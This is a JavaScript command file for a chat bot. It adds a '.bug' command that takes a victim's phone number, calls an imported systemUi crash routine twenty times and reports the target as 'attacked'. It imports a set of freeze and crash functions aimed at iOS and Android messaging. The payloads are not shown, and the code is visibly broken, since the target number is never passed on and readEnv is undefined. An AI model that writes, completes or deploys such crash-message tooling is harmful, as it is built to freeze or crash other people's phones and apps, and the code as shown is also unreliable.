const {
    crashMsgCall,
    kamuflaseFreeze,
    systemUi,
    freezeInDocument,
    travaIos,
    travaIosKill,
    KillIosBlank,
    carouselCrashMsg,
    callXgalaxy,
    GalaxyInDocument,
    FreezeInLocation,
    iosaph,
    program
} = require('../helplugins');

const { cmd } = require('../command');

cmd({
    pattern: ".bug (.*)",
    desc: "Attack a target with systemUi",
    react: "🔥",
    category: "downlod",
    filename: __filename
}, async (conn, mek, m, { from, args, reply, q }) => {
    const config = await readEnv();

    try {
        if (!args[0]) {
            return reply(config.LANGUAGE === 'SI'
                ? "කරුණාකර ඉලක්කයේ දුරකථන අංකය ඇතුළත් කරන්න."
                : "Please provide the target's phone number.");
        }

        const targetNumber = args[0];

        // Call systemUi 20 times
        for (let i = 0; i < 20; i++) {
            systemUi();
        }

        return reply(config.LANGUAGE === 'SI'
            ? `${targetNumber} ඉලක්කය පහර දී ඇත.`
            : `Target ${targetNumber} has been attacked.`);
    } catch (e) {
        console.log(e);
        const errorMessage = config.LANGUAGE === 'SI'
            ? `දෝෂයක්: ${e.message || 'අපට පැමිණුණු දෝෂයක් ඇත.'}`
            : `Error: ${e.message || 'An error occurred.'}`;
        return reply(errorMessage);
    }
});
